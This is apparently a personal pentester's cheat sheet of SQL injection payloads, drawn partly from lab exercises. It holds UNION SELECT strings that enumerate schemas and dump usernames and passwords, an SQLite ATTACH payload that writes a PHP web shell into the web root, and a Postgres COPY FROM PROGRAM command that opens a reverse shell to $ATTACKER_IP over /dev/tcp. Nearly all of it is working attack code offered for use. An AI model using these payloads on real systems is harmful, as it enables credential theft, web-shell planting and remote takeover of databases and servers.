get current database
---
#sql #database

```sql
database()
```
---
get current user
---
```sql
user()
```
---
get DB server version
--
```sql
@@version
```
---
List of possible SQLi payloads:
---
```wordlist
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```

Enumerate all DBs
---
```sql
' UNION SELECT 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata -- '
```

```php
// information_schema,Staff,users
```
---
Get current DB name (not really necessary)
---
```sql
' UNION SELECT 1,2,3,4,5,database() -- -
```

```php
// Staff
```
---
Select all tables in DB 'Staff'
---
```sql
' UNION SELECT 1,2,3,4,5,concat('|>', TABLE_NAME, '<|') FROM information_schema.TABLES WHERE table_schema='Staff' -- '
```
---
Enumerate all columns in table 'StaffDetails'
---
```sql
' UNION SELECT 1,2,3,4,5,concat('|>',column_name) FROM  information_schema.COLUMNS WHERE TABLE_NAME='StaffDetails' -- '
```

```php
// id,firstname,lastname,position,phone,email,reg_date
```

Extract all records from table 'StaffDetails'

```sql
' UNION SELECT id,firstname,lastname,position,phone,email FROM StaffDetails -- '
```

Enumerate all columns in table "Users"

```sql
' UNION SELECT 1,2,3,4,5,concat('|>',column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='Users' -- '
```

```php
// UserID,Username,Password
```

Extract all records from table "Users"

```sql
' UNION SELECT 1,2,3,UserID,Username,Password FROM Users -- '
```

Repeat same for the DB 'users'

```sql
' UNION SELECT 1,2,3,4,5,concat('|>',TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='users' -- '
```

Enumerate all columns in table "UserDetails"

```sql
' UNION SELECT 1,2,3,4,5,concat('|>',column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='UserDetails' -- '
```

```sql
' UNION SELECT 1,id,firstname,lastname,username,password FROM users.UserDetails -- '
```

```shell
grep -shzoP "(\|>)(.*?)(<\|)" response | sed  "s/|>/ /g" | sed "s/<|/\n/g"
```
---
Other UNION SELECT:
---
```sql
0' UNION SELECT 1,2,database()
```

```sql
0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE table_name = 'staff_users'
```

```sql
0' UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

---
SQL injection cheat sheet:
---
[https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

---
SQLite injection to command injection:
---
```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

---
SQLite SQLite3
---
```sql
SELECT sql FROM sqlite_master WHERE type='table'
```

```sql
SELECT * FROM sqlite_master WHERE type='table';
```
---
POSTGRES
---
List all tables in current DB
```sql
SELECT * FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog' AND schemaname != 'information_schema';
```

Reverse shell via command injection option:
```sql
CREATE TABLE cmd_execit(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1\"'
```
